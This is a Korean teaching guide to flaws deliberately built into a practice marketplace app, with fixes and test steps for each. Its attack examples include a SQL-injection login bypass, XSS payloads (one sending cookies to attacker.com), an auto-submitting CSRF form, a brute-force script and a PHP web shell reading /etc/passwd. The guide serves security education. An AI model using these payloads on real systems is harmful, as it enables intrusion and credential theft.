# 보안 취약점 가이드 (교육용)

이 문서는 중고거래 플랫폼에 의도적으로 포함된 보안 취약점들을 설명합니다.
**교육 목적으로만 사용하며, 실제 운영 환경에서는 모든 취약점을 반드시 수정해야 합니다.**

---

## ⚠️ 주요 보안 취약점 목록

### 1. SQL Injection (SQL 인젝션)

#### 📍 위치
- `Login.tsx` - 로그인 폼
- `Register.tsx` - 회원가입 폼
- `Home.tsx` - 상품 검색
- `ProductDetail.tsx` - 리뷰 작성
- `AddProduct.tsx` - 상품 등록
- `CustomerService.tsx` - FAQ 검색

#### 🔴 취약점 설명
사용자 입력을 직접 SQL 쿼리에 포함시키면 공격자가 임의의 SQL 명령을 실행할 수 있습니다.

#### 💣 공격 예시
```javascript
// 취약한 코드 (절대 사용 금지!)
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;

// 공격자 입력
email: "admin' OR '1'='1"
password: "anything"

// 실행되는 쿼리
SELECT * FROM users WHERE email = 'admin' OR '1'='1' AND password = 'anything'
// 결과: 모든 사용자 로그인 가능
```

#### ✅ 해결 방법
```javascript
// Prepared Statement 사용
const query = 'SELECT * FROM users WHERE email = ? AND password = ?';
db.execute(query, [email, hashedPassword]);

// 또는 ORM 사용 (Prisma)
await prisma.user.findFirst({
  where: {
    email: email,
    passwordHash: hashedPassword
  }
});
```

#### 🧪 테스트 방법
1. 로그인 페이지에서 이메일 필드에 `admin' OR '1'='1` 입력
2. 비밀번호 아무거나 입력
3. SQL Injection이 성공하면 로그인 가능

---

### 2. XSS (Cross-Site Scripting)

#### 📍 위치
- `Login.tsx` - 이메일/비밀번호 입력
- `Register.tsx` - 모든 입력 필드
- `Home.tsx` - 검색어
- `ProductDetail.tsx` - 리뷰 작성
- `AddProduct.tsx` - 상품명, 설명
- `Chat.tsx` - 메시지 전송
- `CustomerService.tsx` - 문의 내용

#### 🔴 취약점 설명
사용자 입력을 적절히 필터링하지 않고 HTML로 렌더링하면 악성 스크립트를 삽입할 수 있습니다.

#### 💣 공격 예시
```javascript
// 상품명이나 리뷰에 입력
<script>alert('XSS 공격!')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">

// 더 위험한 공격
<script>
  document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

#### ✅ 해결 방법
```javascript
// React는 기본적으로 XSS 방어
// 하지만 dangerouslySetInnerHTML 사용 시 주의!

// 서버 측에서 HTML 이스케이프
function escapeHtml(text) {
  const map = {
    '&': '&',
    '<': '<',
    '>': '>',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// 또는 라이브러리 사용
import DOMPurify from 'dompurify';
const cleanContent = DOMPurify.sanitize(userInput);
```

#### 🧪 테스트 방법
1. 상품 등록 페이지에서 제목에 `<script>alert('XSS')</script>` 입력
2. 리뷰 작성 시 `<img src=x onerror="alert('XSS')">` 입력
3. 스크립트가 실행되면 XSS 취약점 존재

---

### 3. CSRF (Cross-Site Request Forgery)

#### 📍 위치
- `Login.tsx` - 로그인
- `Register.tsx` - 회원가입
- `AddProduct.tsx` - 상품 등록
- `ProductDetail.tsx` - 리뷰 작성
- `Cart.tsx` - 결제
- `Chat.tsx` - 메시지 전송
- `MyPage.tsx` - 프로필 수정, 비밀번호 변경

#### 🔴 취약점 설명
공격자가 사용자 몰래 악의적인 요청을 보낼 수 있습니다.

#### 💣 공격 예시
```html
<!-- 공격자의 웹사이트 -->
<img src="https://target-site.com/api/users/me" style="display:none">
<form action="https://target-site.com/api/products/123/delete" method="POST" id="malicious">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>document.getElementById('malicious').submit();</script>
```

#### ✅ 해결 방법
```javascript
// 1. CSRF 토큰 사용
// 서버에서 세션마다 고유한 토큰 생성
app.use(csrf());

// 클라이언트에서 토큰 포함
<form onSubmit={handleSubmit}>
  <input type="hidden" name="_csrf" value={csrfToken} />
  {/* ... */}
</form>

// 2. SameSite 쿠키 설정
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// 3. Referer 헤더 검증
if (!req.headers.referer || !req.headers.referer.startsWith('https://your-domain.com')) {
  return res.status(403).send('Forbidden');
}
```

#### 🧪 테스트 방법
1. 로그인 후 다른 탭에서 악의적인 폼 작성
2. 자동으로 제출되도록 설정
3. CSRF 방어가 없으면 공격 성공

---

### 4. IDOR (Insecure Direct Object Reference)

#### 📍 위치
- `ProductDetail.tsx` - 상품 ID로 직접 조회
- `Cart.tsx` - 장바구니 아이템 ID
- `Chat.tsx` - 채팅방 ID
- `CustomerService.tsx` - 문의 ID
- `MyPage.tsx` - 주문 ID, 찜 목록 ID

#### 🔴 취약점 설명
예측 가능한 ID로 권한 없이 다른 사용자의 리소스에 접근할 수 있습니다.

#### 💣 공격 예시
```javascript
// 본인의 주문
GET /api/orders/12345

// 다른 사용자의 주문 (권한 없음에도 접근 가능)
GET /api/orders/12346
GET /api/orders/12347
// ... 순차적으로 모든 주문 정보 열람 가능
```

#### ✅ 해결 방법
```javascript
// 1. UUID 사용 (예측 불가능한 ID)
// 나쁜 예: id = 1, 2, 3, ...
// 좋은 예: id = '550e8400-e29b-41d4-a716-446655440000'

// 2. 권한 검증
app.get('/api/orders/:id', async (req, res) => {
  const order = await db.order.findFirst({
    where: {
      id: req.params.id,
      userId: req.session.userId  // 본인 것만 조회
    }
  });
  
  if (!order) {
    return res.status(404).send('Not found');
  }
  
  res.json(order);
});

// 3. 간접 참조 사용
// URL에 직접 ID 노출하지 않고 세션 정보로 조회
GET /api/orders/mine  // 내 주문 전체
GET /api/orders/latest  // 최근 주문
```

#### 🧪 테스트 방법
1. 로그인 후 자신의 주문 상세 페이지 URL 확인
2. URL의 ID를 +1, -1 변경하여 접근
3. 다른 사용자의 정보가 보이면 IDOR 취약점 존재

---

### 5. 평문 비밀번호 저장/전송

#### 📍 위치
- `Login.tsx` - 로그인 시 평문 전송
- `Register.tsx` - 회원가입 시 평문 저장
- `MyPage.tsx` - 비밀번호 변경 시 평문 전송

#### 🔴 취약점 설명
비밀번호를 암호화하지 않고 저장하거나 전송하면 유출 시 즉시 악용 가능합니다.

#### 💣 공격 시나리오
```javascript
// 데이터베이스 유출 시
users table:
id | email              | password
1  | user@example.com  | password123  ← 평문 그대로 노출!
2  | admin@example.com | admin123

// 중간자 공격 (Man-in-the-Middle)
// HTTP 사용 시 패킷 스니핑으로 비밀번호 탈취
```

#### ✅ 해결 방법
```javascript
// 1. HTTPS 사용 필수
// Let's Encrypt로 무료 SSL 인증서 발급

// 2. 비밀번호 해싱 (bcrypt)
const bcrypt = require('bcrypt');

// 회원가입 시
const saltRounds = 10;
const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);
await db.user.create({
  data: {
    email,
    passwordHash: hashedPassword  // 해시만 저장
  }
});

// 로그인 시
const user = await db.user.findUnique({ where: { email } });
const isValid = await bcrypt.compare(plainPassword, user.passwordHash);

// 3. 절대 로그에 비밀번호 남기지 않기
console.log({ email, password: '***' });  // ✅
console.log({ email, password });  // ❌
```

#### 🧪 테스트 방법
1. 회원가입 후 데이터베이스 직접 확인
2. password 필드에 평문이 보이면 취약
3. 네트워크 탭에서 요청 확인 (HTTP면 취약)

---

### 6. Brute Force 공격 방어 부재

#### 📍 위치
- `Login.tsx` - 로그인 시도 제한 없음

#### 🔴 취약점 설명
로그인 시도 횟수 제한이 없어 무차별 대입 공격이 가능합니다.

#### 💣 공격 예시
```python
# 자동화 스크립트로 비밀번호 무차별 대입
passwords = ['123456', 'password', '12345678', 'qwerty', ...]
for pwd in passwords:
    response = requests.post('https://site.com/api/auth/login', {
        'email': 'victim@example.com',
        'password': pwd
    })
    if response.status_code == 200:
        print(f'Found: {pwd}')
        break
```

#### ✅ 해결 방법
```javascript
// 1. Rate Limiting (Express 예시)
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15분
  max: 5, // 최대 5회 시도
  message: '너무 많은 로그인 시도입니다. 나중에 다시 시도해주세요.'
});

app.post('/api/auth/login', loginLimiter, async (req, res) => {
  // 로그인 로직
});

// 2. 계정 잠금
const attempts = await db.loginAttempt.count({
  where: {
    email: req.body.email,
    success: false,
    attemptedAt: { gte: new Date(Date.now() - 30 * 60 * 1000) }
  }
});

if (attempts >= 5) {
  return res.status(429).json({ error: '계정이 잠겼습니다.' });
}

// 3. CAPTCHA 추가 (reCAPTCHA v3)
<ReCAPTCHA
  sitekey="your-site-key"
  onChange={handleCaptcha}
/>
```

#### 🧪 테스트 ��법
1. 로그인 페이지에서 틀린 비밀번호로 연속 시도
2. 10회 이상 시도해도 차단되지 않으면 취약

---

### 7. 파일 업로드 취약점

#### 📍 위치
- `AddProduct.tsx` - 상품 이미지 업로드

#### 🔴 취약점 설명
파일 검증 없이 업로드하면 악성 파일이나 웹 쉘을 업로드할 수 있습니다.

#### 💣 공격 예시
```php
<!-- shell.php -->
<?php system($_GET['cmd']); ?>

// 업로드 후
https://site.com/uploads/shell.php?cmd=ls
https://site.com/uploads/shell.php?cmd=cat /etc/passwd
```

#### ✅ 해결 방법
```javascript
// 1. 파일 타입 검증
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
if (!allowedTypes.includes(file.mimetype)) {
  return res.status(400).send('Invalid file type');
}

// 2. 파일 크기 제한
const maxSize = 5 * 1024 * 1024; // 5MB
if (file.size > maxSize) {
  return res.status(400).send('File too large');
}

// 3. 파일명 변경 (UUID 사용)
const crypto = require('crypto');
const ext = path.extname(file.originalname);
const newName = crypto.randomUUID() + ext;

// 4. 파일 내용 검증 (magic number)
const fileType = require('file-type');
const type = await fileType.fromBuffer(file.buffer);
if (!type || !allowedTypes.includes(type.mime)) {
  return res.status(400).send('Invalid file');
}

// 5. 별도 스토리지에 저장 (S3, R2)
// 웹 서버와 분리하여 스크립트 실행 방지
```

#### 🧪 테스트 방법
1. .php, .jsp, .asp 확장자 파일 업로드 시도
2. 대용량 파일 (10GB+) 업로드 시도
3. 이미지가 아닌 파일을 이미지로 위장하여 업로드

---

### 8. 권한 검증 부족

#### 📍 위치
- `AddProduct.tsx` - 클라이언트 측 권한 확인만
- `ProductDetail.tsx` - 리뷰 삭제 시 권한 미확인
- `MyPage.tsx` - 프로필 수정 시 권한 미확인

#### 🔴 취약점 설명
클라이언트 측 권한 확인만으로는 우회 가능합니다.

#### 💣 공격 예시
```javascript
// 클라이언트 코드 우회
// F12 개발자 도구로 React 상태 변경
window.__REACT_DEVTOOLS_GLOBAL_HOOK__.renderers.get(1).currentFiber.memoizedState.isAdmin = true;

// 또는 직접 API 호출
fetch('/api/products', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ /* 상품 정보 */ })
});
// 서버에서 권한 확인하지 않으면 일반 사용자도 등록 가능
```

#### ✅ 해결 방법
```javascript
// 서버에서 반드시 권한 확인
app.post('/api/products', requireAuth, async (req, res) => {
  // 로그인 확인
  if (!req.session.userId) {
    return res.status(401).send('Unauthorized');
  }
  
  // 상품 수정 시 본인 확인
  const product = await db.product.findUnique({
    where: { id: req.params.id }
  });
  
  if (product.sellerId !== req.session.userId) {
    return res.status(403).send('Forbidden');
  }
  
  // 권한 확인 후 처리
});

// 관리자 전용 기능
app.delete('/api/users/:id', requireAuth, requireAdmin, async (req, res) => {
  if (!req.session.isAdmin) {
    return res.status(403).send('Admin only');
  }
  // ...
});
```

#### 🧪 테스트 방법
1. 일반 사용자로 로그인
2. 관리자 전용 API 직접 호출
3. 성공하면 권한 검증 부족

---

### 9. Race Condition

#### 📍 위치
- `Cart.tsx` - 결제 시 재고 확인

#### 🔴 취약점 설명
동시에 여러 요청이 처리되면 재고보다 많이 판매될 수 있습니다.

#### 💣 공격 시나리오
```javascript
// 재고 1개 남은 상품
// 사용자 A와 B가 동시에 구매

User A: SELECT stock FROM products WHERE id = 1  → 1
User B: SELECT stock FROM products WHERE id = 1  → 1

User A: UPDATE products SET stock = 0 WHERE id = 1  ✅
User B: UPDATE products SET stock = 0 WHERE id = 1  ✅

// 결과: 재고 1개인데 2명에게 판매됨!
```

#### ✅ 해결 방법
```javascript
// 1. 트랜잭션 + 락 사용
await db.$transaction(async (tx) => {
  const product = await tx.product.findUnique({
    where: { id: productId },
    select: { stock: true }
  });
  
  if (product.stock < quantity) {
    throw new Error('재고 부족');
  }
  
  // Atomic operation
  await tx.product.update({
    where: { id: productId },
    data: { stock: { decrement: quantity } }
  });
  
  await tx.order.create({ /* ... */ });
});

// 2. Optimistic Locking
UPDATE products 
SET stock = stock - 1, version = version + 1
WHERE id = ? AND version = ? AND stock >= 1;

// 3. Redis를 이용한 분산 락
const Redlock = require('redlock');
const lock = await redlock.lock(`product:${productId}`, 1000);
try {
  // 재고 처리
} finally {
  await lock.unlock();
}
```

#### 🧪 테스트 방법
1. 재고 1개 남은 상품 준비
2. 두 브라우저에서 동시에 구매 클릭
3. 둘 다 성공하면 Race Condition 취약점 존재

---

### 10. 정보 노출 (Information Disclosure)

#### 📍 위치
- `Login.tsx` - 상세한 에러 메시지
- API 응답 - 스택 트레이스 노출

#### 🔴 취약점 설명
과도하게 상세한 에러 메시지는 공격자에게 유용한 정보를 제공합니다.

#### 💣 공격 예시
```javascript
// 나쁜 예
"이메일이 존재하지 않습니다"  // 이메일 존재 여부 확인 가능
"비밀번호가 틀렸습니다"      // 이메일은 맞다는 정보 노출

// 스택 트레이스 노출
{
  "error": "Error: Connection failed",
  "stack": "at Database.connect (/app/db.js:45:10)...",
  "query": "SELECT * FROM users WHERE email = 'test@test.com'"
}
// 데이터베이스 구조, 파일 경로 등 노출
```

#### ✅ 해결 방법
```javascript
// 1. 일반적인 에러 메시지 사용
if (!user || !isValidPassword) {
  return res.status(401).json({
    error: '이메일 또는 비밀번호가 일치하지 않습니다'
  });
}

// 2. 에러 처리 미들웨어
app.use((err, req, res, next) => {
  // 로그에는 상세 내용 기록
  logger.error(err.stack);
  
  // 클라이언트에는 간단한 메시지만
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: '서버 오류가 발생했습니다' });
  } else {
    // 개발 환경에서만 상세 정보
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// 3. API 응답에서 민감한 정보 제거
const userResponse = {
  id: user.id,
  username: user.username,
  email: user.email
  // passwordHash, apiKey 등은 제외
};
```

#### 🧪 테스트 방법
1. 존재하지 않는 이메일로 로그인 시도
2. 존재하는 이메일 + 틀린 비밀번호로 시도
3. 에러 메시지가 다르면 정보 노출 취약점

---

## 🛡️ 종합 보안 체크리스트

### 인증 & 세션
- [ ] 비밀번호 bcrypt로 해싱
- [ ] HTTPS 사용
- [ ] HttpOnly, Secure 쿠키
- [ ] 세션 만료 시간 설정
- [ ] 로그인 시도 제한

### 입력 검증
- [ ] SQL Injection 방지 (Prepared Statement)
- [ ] XSS 방지 (HTML 이스케이프)
- [ ] 파일 업로드 검증
- [ ] 입력값 길이 제한
- [ ] 화이트리스트 방식 검증

### 권한 관리
- [ ] 서버 측 권한 검증
- [ ] IDOR 방지 (UUID 사용)
- [ ] CSRF 토큰 사용
- [ ] API Rate Limiting

### 데이터 보호
- [ ] 개인정보 암호화
- [ ] 로그에 민감정보 제거
- [ ] 정보 노출 최소화
- [ ] 데이터베이스 백업

### 기타
- [ ] 보안 헤더 설정 (helmet.js)
- [ ] CORS 설정
- [ ] 로깅 및 모니터링
- [ ] 정기적인 보안 업데이트

---

## 📚 참고 자료

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP Cheat Sheet**: https://cheatsheetseries.owasp.org/
- **CWE (Common Weakness Enumeration)**: https://cwe.mitre.org/
- **Node.js Security Best Practices**: https://nodejs.org/en/docs/guides/security/

---

## ⚖️ 법적 고지

이 취약점들은 **교육 목적**으로만 사용해야 합니다.
실제 운영 중인 시스템에 대한 무단 침투 테스트는 법적 문제가 될 수 있습니다.

**절대 다음 행위를 하지 마세요:**
- 허가 없이 다른 사람의 시스템 공격
- 개인정보 무단 수집
- 서비스 방해 (DoS)
- 악성 코드 배포

---

## 🎓 교육 활용 방법

1. **이론 학습**: 각 취약점의 원리 이해
2. **실습**: 로컬 환경에서 공격 시연
3. **방어**: 취약점 수정 후 재테스트
4. **토론**: 실제 사례 분석 및 대응 방안 논의

이 플랫폼을 통해 보안의 중요성을 체감하고, 안전한 웹 애플리케이션 개발 능력을 키우시길 바랍니다!
